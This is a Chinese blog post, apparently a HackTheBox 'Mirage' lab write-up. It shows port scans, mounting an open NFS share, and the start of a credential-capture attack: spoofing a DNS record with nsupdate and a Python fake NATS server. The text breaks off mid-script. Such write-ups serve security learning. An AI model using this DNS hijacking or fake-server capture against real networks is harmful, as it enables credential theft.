<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/Y3nJeCc9colvxStlHZeEt/_buildManifest.js" defer=""></script><script src="/_next/static/Y3nJeCc9colvxStlHZeEt/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Mirage","contentHtml":"\u003ch1\u003eSeason8 - Mirage\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Mirage\"\u003ehttps://app.hackthebox.com/machines/Mirage\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nmap -sT -min-rate 5000 -p- 10.10.11.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 21:20 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.78\nHost is up (0.055s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n111/tcp   open  rpcbind\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n2049/tcp  open  nfs\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n4222/tcp  open  vrml-multi-use\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n50441/tcp open  unknown\n60301/tcp open  unknown\n60308/tcp open  unknown\n60309/tcp open  unknown\n60322/tcp open  unknown\n60325/tcp open  unknown\n60342/tcp open  unknown\n60365/tcp open  unknown\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.98 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 10.10.11.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 21:23 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.78\nHost is up (0.075s latency).\n\nPORT      STATE SERVICE         VERSION\n53/tcp    open  domain          Simple DNS Plus\n88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-07-20 20:00:10Z)\n111/tcp   open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|_  100005  1,2,3       2049/udp6  mountd\n135/tcp   open  msrpc           Microsoft Windows RPC\n139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn\n389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n2049/tcp  open  mountd          1-3 (RPC \u003cspan class=\"hljs-comment\"\u003e#100005)\u003c/span\u003e\n3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n4222/tcp  open  vrml-multi-use?\n| fingerprint-strings:\n|   GenericLines:\n|     INFO {\u003cspan class=\"hljs-string\"\u003e\"server_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"server_name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.11.3\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"proto\"\u003c/span\u003e:1,\u003cspan class=\"hljs-string\"\u003e\"git_co\nmmit\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"a82cfda\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"go\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"go1.24.2\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"host\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"port\"\u003c/span\u003e:4222,\u003cspan class=\"hljs-string\"\u003e\"headers\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"auth_required\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"max_payload\"\u003c/span\u003e:1048576,\u003cspan class=\"hljs-string\"\u003e\"jetstream\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"client_id\"\u003c/span\u003e:400,\u003cspan class=\"hljs-string\"\u003e\"client_ip\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;Your-IP\u003e\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"xkey\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"XB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"\u003c/span\u003e}\n|     -ERR \u003cspan class=\"hljs-string\"\u003e'Authorization Violation'\u003c/span\u003e\n|   GetRequest:\n|     INFO {\u003cspan class=\"hljs-string\"\u003e\"server_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"server_name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.11.3\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"proto\"\u003c/span\u003e:1,\u003cspan class=\"hljs-string\"\u003e\"git_co\nmmit\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"a82cfda\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"go\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"go1.24.2\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"host\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"port\"\u003c/span\u003e:4222,\u003cspan class=\"hljs-string\"\u003e\"headers\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"auth_required\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"max_payload\"\u003c/span\u003e:1048576,\u003cspan class=\"hljs-string\"\u003e\"jetstream\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"client_id\"\u003c/span\u003e:401,\u003cspan class=\"hljs-string\"\u003e\"client_ip\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;Your-IP\u003e\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"xkey\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"XB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"\u003c/span\u003e}\n|     -ERR \u003cspan class=\"hljs-string\"\u003e'Authorization Violation'\u003c/span\u003e\n|   HTTPOptions:\n|     INFO {\u003cspan class=\"hljs-string\"\u003e\"server_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"server_name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.11.3\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"proto\"\u003c/span\u003e:1,\u003cspan class=\"hljs-string\"\u003e\"git_co\n|     -ERR 'Authorization Violation'\n|   NULL:\n|     INFO {\"\u003c/span\u003eserver_id\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003eNBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003eserver_name\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003eNBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003eversion\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003e2.11.3\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003eproto\u003cspan class=\"hljs-string\"\u003e\":1,\"\u003c/span\u003egit_co\nmmit\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003ea82cfda\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003ego\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003ego1.24.2\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003ehost\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003e0.0.0.0\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003eport\u003cspan class=\"hljs-string\"\u003e\":4222,\"\u003c/span\u003eheaders\u003cspan class=\"hljs-string\"\u003e\":true,\"\u003c/span\u003eauth_required\u003cspan class=\"hljs-string\"\u003e\":true,\"\u003c/span\u003emax_payload\u003cspan class=\"hljs-string\"\u003e\":1048576,\"\u003c/span\u003ejetstream\u003cspan class=\"hljs-string\"\u003e\":true,\"\u003c/span\u003eclient_id\u003cspan class=\"hljs-string\"\u003e\":399,\"\u003c/span\u003eclient_ip\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003e\u0026#x3C;Your-IP\u003e\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003exkey\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003eXB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\u003cspan class=\"hljs-string\"\u003e\"}\n|_    -ERR 'Authentication Timeout'\n5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf          .NET Message Framing\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows Server 2022 (96%), Windows Server 2019 (95%), Microsoft Windows Server 2012 or 2012 R2 (94%), Micro\nsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windo\nws Server 2016 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-20T20:01:00\n|_  start_date: N/A\n|_clock-skew: 6h36m31s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   92.73 ms 10.10.16.1\n2   52.80 ms 10.10.11.78\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举测试\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e 匿名测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage smbclient -L 10.10.11.78 -U anonymous\nsession setup failed: NT_STATUS_NOT_SUPPORTED\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eRPC\u003c/code\u003e 匿名测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage rpcclient 10.10.11.78 -U \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e -N -c enumdomusers\nCannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eNFS\u003c/code\u003e 枚举\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage showmount -e 10.10.11.78             \nExport list \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.78:\n/MirageReports (everyone)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现 \u003ccode\u003e/MirageReports\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e将其挂载到本机上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage \u003cspan class=\"hljs-built_in\"\u003emkdir\u003c/span\u003e MirageReports                                  \n➜  Mirage mount -t nfs 10.10.11.78:/MirageReports ./MirageReports\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e里边是两个\u003ccode\u003ePDF\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  MirageReports \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nIncident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e翻译过来大概就是：事件报告缺失DNS记录nats-svc、Mirage身份验证强化报告\u003c/p\u003e\n\u003cp\u003e一些重要内容：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e2025年5月3日，开发团队报告称，他们无法解析主机名 \u003ccode\u003enats-svc.mirage.htb\u003c/code\u003e。该主机名对于与托管在 \u003ccode\u003eMirage\u003c/code\u003e 域上的 \u003ccode\u003eNATS\u003c/code\u003e 消息系统进行内部服务通信至关重要。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003enats-svc.mirage.htb\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e连接的照片\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e另一个大概就是要弃用 \u003ccode\u003eNTLM\u003c/code\u003e 启动\u003ccode\u003eKerberos\u003c/code\u003e ，但现在应该不完全是\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ead-security@mirage.htb\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e劫持 NATS Server\u003c/h2\u003e\n\u003cp\u003e到这里一头雾水，抄了下作业\u003c/p\u003e\n\u003cp\u003e原理大概就是我们模仿 \u003ccode\u003eNats\u003c/code\u003e服务器\u003c/p\u003e\n\u003cp\u003e我们首先使用 \u003ccode\u003ensupdate\u003c/code\u003e 来让目标DNS 服务器（DC）将记录\u003ccode\u003enats-svc.mirage.htb\u003c/code\u003e 更新为我们的\u003ccode\u003eIP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后我们写一个 \u003ccode\u003eSocket\u003c/code\u003e 脚本，监听 \u003ccode\u003e4222\u003c/code\u003e 端口，并且返回数据给对方，我们再接收用户登录的数据\u003c/p\u003e\n\u003cp\u003e我们首先访问\u003ccode\u003enats-svc.mirage.htb 4222\u003c/code\u003e 看一下服务器会回复什么信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nc nats-svc.mirage.htb 4222\nINFO {\u003cspan class=\"hljs-string\"\u003e\"server_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"server_name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.11.3\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"proto\"\u003c/span\u003e:1,\u003cspan class=\"hljs-string\"\u003e\"git_commit\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"a82cfda\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"go\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"go1.24.2\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"host\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"port\"\u003c/span\u003e:4222,\u003cspan class=\"hljs-string\"\u003e\"headers\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"auth_required\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"max_payload\"\u003c/span\u003e:1048576,\u003cspan class=\"hljs-string\"\u003e\"jetstream\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"client_id\"\u003c/span\u003e:595,\u003cspan class=\"hljs-string\"\u003e\"client_ip\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;Your-IP\u003e\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"xkey\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"\u003c/span\u003e} \n-ERR \u003cspan class=\"hljs-string\"\u003e'Authentication Timeout'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e放到脚本 \u003ccode\u003efake_server.py\u003c/code\u003e 中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport socket\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'[+] 模拟 Nats 服务器开启：'\u003c/span\u003e)\ns = socket.socket()\ns.bind((\"\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\",\u003cspan class=\"hljs-number\"\u003e4222\u003c/span\u003e))\ns.listen(5)\n\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e True:\n    c,addr = s.accept()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] 连接的地址是:\"\u003c/span\u003e,addr)\n    c.sendall(b\u003cspan class=\"hljs-string\"\u003e'INFO 